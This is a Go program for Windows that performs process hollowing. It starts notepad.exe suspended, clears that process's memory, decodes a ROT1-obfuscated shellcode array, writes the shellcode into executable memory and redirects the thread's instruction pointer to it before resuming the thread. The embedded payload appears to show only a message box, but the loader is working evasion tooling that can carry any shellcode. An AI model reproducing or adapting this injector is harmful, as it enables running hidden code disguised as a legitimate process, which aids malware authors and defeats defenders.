package main

	import (
		"fmt"
		"syscall"
		"unsafe"
	
		"golang.org/x/sys/windows"
	)
	
	// Necessary constants defining
	const (
		MEM_COMMIT    = 0x00001000
		MEM_RESERVE   = 0x00002000
		MEM_RELEASE   = 0x00008000
		PAGE_READWRITE = 0x04
		PAGE_EXECUTE_READWRITE = 0x40
		CONTEXT_CONTROL = 0x100001
	)
	
	// CONTEXT struct defining for manipulate RIP register
	type Context struct {
		P1Home              uint64
		P2Home              uint64
		P3Home              uint64
		P4Home              uint64
		P5Home              uint64
		P6Home              uint64
		ContextFlags        uint32
		MxCsr               uint32
		SegCs, SegDs        uint16
		SegEs, SegFs        uint16
		SegGs, SegSs        uint16
		EFlags              uint32
		Dr0, Dr1, Dr2, Dr3  uint64
		Dr6, Dr7            uint64
		Rax, Rcx, Rdx, Rbx  uint64
		Rsp, Rbp, Rsi, Rdi  uint64
		R8, R9, R10, R11    uint64
		R12, R13, R14, R15  uint64
		Rip                 uint64
		DebugControl        uint64
		LastBranchToRip     uint64
		LastBranchFromRip   uint64
		LastExceptionToRip  uint64
		LastExceptionFromRip uint64
	}
	
	
	func freeProcessMemory(processHandle windows.Handle) {
		var mbi windows.MemoryBasicInformation
		address := uintptr(0)
	
		fmt.Println("empy process memory...")
	
		for {
			// query the process handle
			ret := windows.VirtualQueryEx(processHandle, address, &mbi, unsafe.Sizeof(mbi))
			if ret == nil {
				break
			}
	
			// check if memory is commited
			if mbi.State == MEM_COMMIT {
				// Free the memory
				kernel32 := windows.NewLazySystemDLL("kernel32.dll")
				virtualFreeEx := kernel32.NewProc("VirtualFreeEx")
				_, _, _ = virtualFreeEx.Call(uintptr(processHandle), uintptr(mbi.BaseAddress), 0, MEM_RELEASE)
				fmt.Printf("Mémoire libérée à l'adresse : 0x%x\n", mbi.BaseAddress)
			}
	
			// iterate through regions
			address += mbi.RegionSize
		}
		fmt.Println("memory cleaned")
	}
	

	func rot1Decrypt(input []byte) []byte {
		// Reverse ROT1 transformation for all ASCII characters
		decrypted := make([]byte, len(input))
		for i, b := range input {
			decrypted[i] = byte(b - 1)
		}
		return decrypted
	}
	
	func main() {
		// target processs
		legitProcess := "C:\\Windows\\System32\\notepad.exe"
	
		// suspended process creation structure definition
		var startupInfo windows.StartupInfo
		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
		var processInfo windows.ProcessInformation
	
		err := windows.CreateProcess(
			syscall.StringToUTF16Ptr(legitProcess),
			nil,
			nil,
			nil,
			false,
			windows.CREATE_SUSPENDED,
			nil,
			nil,
			&startupInfo,
			&processInfo,
		)
			if err != nil {
				return
			}
		
	
		fmt.Printf("jegitimate process launched at (PID = %d)\n", processInfo.ProcessId)
	
		processHandle := processInfo.Process
		defer windows.CloseHandle(processHandle)
	
		// free the memory
		freeProcessMemory(processHandle)
	
		rot1Sc := []byte{0xFD, 0x49, 0x82, 0xE5, 0xF1, 0x0, 0x0, 0x0, 0xE9, 0xD1, 0x1, 0x1, 0x1, 0x42, 0x52, 0x42, 0x51, 0x53, 0x52, 0x57, 0x49, 0x32, 0xD3, 0x66, 0x49, 0x8C, 0x53, 0x61, 0x3F, 0x49, 0x8C, 0x53, 0x19, 0x3F, 0x49, 0x8C, 0x53, 0x21, 0x3F, 0x49, 0x8C, 0x73, 0x51, 0x3F, 0x49, 0x10, 0xB8, 0x4B, 0x4B, 0x4E, 0x32, 0xCA, 0x49, 0x32, 0xC1, 0xAD, 0x3D, 0x62, 0x7D, 0x3, 0x2D, 0x21, 0x42, 0xC2, 0xCA, 0xE, 0x42, 0x2, 0xC2, 0xE3, 0xEE, 0x53, 0x42, 0x52, 0x3F, 0x49, 0x8C, 0x53, 0x21, 0x3F, 0x8C, 0x43, 0x3D, 0x49, 0x2, 0xD1, 0x3F, 0x8C, 0x81, 0x89, 0x1, 0x1, 0x1, 0x49, 0x86, 0xC1, 0x75, 0x70, 0x49, 0x2, 0xD1, 0x51, 0x3F, 0x8C, 0x49, 0x19, 0x3F, 0x45, 0x8C, 0x41, 0x21, 0x4A, 0x2, 0xD1, 0xE4, 0x5D, 0x49, 0x0, 0xCA, 0x3F, 0x42, 0x8C, 0x35, 0x89, 0x49, 0x2, 0xD7, 0x4E, 0x32, 0xCA, 0x49, 0x32, 0xC1, 0xAD, 0x42, 0xC2, 0xCA, 0xE, 0x42, 0x2, 0xC2, 0x39, 0xE1, 0x76, 0xF2, 0x3F, 0x4D, 0x4, 0x4D, 0x25, 0x9, 0x46, 0x3A, 0xD2, 0x76, 0xD7, 0x59, 0x3F, 0x45, 0x8C, 0x41, 0x25, 0x4A, 0x2, 0xD1, 0x67, 0x3F, 0x42, 0x8C, 0xD, 0x49, 0x3F, 0x45, 0x8C, 0x41, 0x1D, 0x4A, 0x2, 0xD1, 0x3F, 0x42, 0x8C, 0x5, 0x89, 0x49, 0x2, 0xD1, 0x42, 0x59, 0x42, 0x59, 0x5F, 0x5A, 0x5B, 0x42, 0x59, 0x42, 0x5A, 0x42, 0x5B, 0x49, 0x84, 0xED, 0x21, 0x42, 0x53, 0x0, 0xE1, 0x59, 0x42, 0x5A, 0x5B, 0x3F, 0x49, 0x8C, 0x13, 0xEA, 0x4A, 0x0, 0x0, 0x0, 0x5E, 0x3F, 0x49, 0x8E, 0x8E, 0x28, 0x2, 0x1, 0x1, 0x42, 0xBB, 0x4D, 0x78, 0x27, 0x8, 0x0, 0xD6, 0x4A, 0xC8, 0xC2, 0x1, 0x1, 0x1, 0x1, 0x3F, 0x49, 0x8E, 0x96, 0xF, 0x2, 0x1, 0x1, 0x3F, 0x4D, 0x8E, 0x86, 0x1D, 0x2, 0x1, 0x1, 0x49, 0x32, 0xCA, 0x42, 0xBB, 0x46, 0x84, 0x57, 0x8, 0x0, 0xD6, 0x49, 0x32, 0xCA, 0x42, 0xBB, 0xF1, 0xB6, 0xA3, 0x57, 0x0, 0xD6, 0x74, 0x69, 0x66, 0x6D, 0x6D, 0x64, 0x70, 0x65, 0x66, 0x21, 0x73, 0x76, 0x6F, 0x1, 0x4E, 0x66, 0x74, 0x74, 0x62, 0x68, 0x66, 0x43, 0x70, 0x79, 0x1, 0x76, 0x74, 0x66, 0x73, 0x34, 0x33, 0x2F, 0x65, 0x6D, 0x6D, 0x1, 0x1, 0x69, 0x42, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x81, 0x42, 0x1, 0x1, 0x1, 0x31, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x8F, 0x42, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x9F, 0x42, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x4C, 0x46, 0x53, 0x4F, 0x46, 0x4D, 0x34, 0x33, 0x2F, 0x65, 0x6D, 0x6D, 0x1, 0x1, 0x59, 0x5, 0x57, 0x6A, 0x73, 0x75, 0x76, 0x62, 0x6D, 0x42, 0x6D, 0x6D, 0x70, 0x64, 0x1, 0x1, 0x6, 0x2, 0x46, 0x79, 0x6A, 0x75, 0x51, 0x73, 0x70, 0x64, 0x66, 0x74, 0x74, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x9, 0x1, 0x1, 0x1,}
		shellcode := rot1Decrypt(rot1Sc)
	
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
		addr, _, _ := virtualAllocEx.Call(
			uintptr(processHandle),
			0,
			uintptr(len(shellcode)),
			MEM_COMMIT|MEM_RESERVE,
			PAGE_EXECUTE_READWRITE,
		)
	
		// Write the shellcode in the process memory
		var bytesWritten uintptr
		err = windows.WriteProcessMemory(processHandle, addr, &shellcode[0], uintptr(len(shellcode)), &bytesWritten)
		
		fmt.Printf("Injected shellcode : %d written bytes.\n", bytesWritten)
	
		// Modify thread context
		threadHandle := processInfo.Thread
		ctx := Context{ContextFlags: CONTEXT_CONTROL}
		ntdll := windows.NewLazySystemDLL("ntdll.dll")
		getThreadContext := ntdll.NewProc("NtGetContextThread")
		setThreadContext := ntdll.NewProc("NtSetContextThread")
	
		_, _, err = getThreadContext.Call(uintptr(threadHandle), uintptr(unsafe.Pointer(&ctx)))
		
	
		ctx.Rip = uint64(addr)
		_, _, err = setThreadContext.Call(uintptr(threadHandle), uintptr(unsafe.Pointer(&ctx)))
		
	
		// resume execution
		resumeThread := kernel32.NewProc("ResumeThread")
		_, _, _ = resumeThread.Call(uintptr(threadHandle))
		fmt.Println("Process hollowing terminé.")
	}
	
